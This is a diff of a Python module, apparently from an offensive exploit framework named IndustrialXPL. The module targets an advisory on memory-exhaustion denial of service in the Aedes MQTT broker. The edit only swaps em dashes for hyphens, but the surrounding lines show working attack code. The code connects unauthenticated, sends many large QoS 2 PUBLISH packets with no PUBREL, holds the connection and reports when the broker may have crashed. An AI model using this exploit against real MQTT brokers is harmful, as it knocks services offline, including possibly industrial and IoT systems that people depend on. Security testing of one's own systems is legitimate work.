@@ -1,4 +1,4 @@
-"""IndustrialXPL Protocol Module — GHSA-5jvp-3p2v-5qgf (Aedes MQTT QoS 2 Memory Exhaustion DoS).
+"""IndustrialXPL Protocol Module - GHSA-5jvp-3p2v-5qgf (Aedes MQTT QoS 2 Memory Exhaustion DoS).
 
 Memory exhaustion (DoS) in Aedes MQTT broker (Node.js) when handling
 QoS 2 messages. Inbound QoS 2 PUBLISH message bodies are stored in memory
@@ -23,7 +23,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":             "GHSA-5jvp-3p2v-5qgf — Aedes MQTT QoS 2 Memory Exhaustion DoS",
+        "name":             "GHSA-5jvp-3p2v-5qgf - Aedes MQTT QoS 2 Memory Exhaustion DoS",
         "description":      "Aedes MQTT broker memory exhaustion: QoS 2 PUBLISH bodies accumulate without PUBREL (queueLimit not applied to this path). Unauthenticated. Fixed in 1.2.0. CVSS 7.5.",
         "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
         "references":       (
@@ -108,7 +108,7 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "GHSA-5jvp-3p2v-5qgf — Aedes MQTT QoS 2 Memory Exhaustion DoS\n"
+                    "GHSA-5jvp-3p2v-5qgf - Aedes MQTT QoS 2 Memory Exhaustion DoS\n"
                     "CVSS 7.5 | Unauthenticated | Aedes < 1.2.0\n\n"
                     "Vulnerability: Inbound QoS 2 PUBLISH bodies stored in memory\n"
                     "pending PUBREL/PUBCOMP. The 'queueLimit' option is NOT enforced\n"
@@ -134,11 +134,11 @@ class Exploit(Exploit):
             s.sendall(connect)
             connack = s.recv(4)
             if not connack or connack[0] != 0x20:
-                print_warning("[GHSA-5jvp-3p2v-5qgf] CONNACK not received — not an MQTT broker or auth required")
+                print_warning("[GHSA-5jvp-3p2v-5qgf] CONNACK not received - not an MQTT broker or auth required")
                 s.close()
                 return
 
-            print_success(f"[GHSA-5jvp-3p2v-5qgf] Connected to MQTT broker — sending {self.packets} QoS 2 PUBLISH (no PUBREL)")
+            print_success(f"[GHSA-5jvp-3p2v-5qgf] Connected to MQTT broker - sending {self.packets} QoS 2 PUBLISH (no PUBREL)")
             payload_size = self.payload_kb * 1024
             for i in range(1, self.packets + 1):
                 pkt = self._build_qos2_publish(i, payload_size)
@@ -152,11 +152,11 @@ class Exploit(Exploit):
                     pass
 
             print_success(f"[GHSA-5jvp-3p2v-5qgf] Sent {self.packets} QoS 2 packets (~{self.packets * self.payload_kb}KB stored in broker)")
-            print_info("[GHSA-5jvp-3p2v-5qgf] Keeping connection open — broker memory is accumulating...")
+            print_info("[GHSA-5jvp-3p2v-5qgf] Keeping connection open - broker memory is accumulating...")
             time.sleep(5)
             s.close()
         except ConnectionResetError:
-            print_success("[GHSA-5jvp-3p2v-5qgf] Connection reset — broker may have crashed (OOM)!")
+            print_success("[GHSA-5jvp-3p2v-5qgf] Connection reset - broker may have crashed (OOM)!")
         except Exception as e:
             print_error(f"[GHSA-5jvp-3p2v-5qgf] {e}")
 
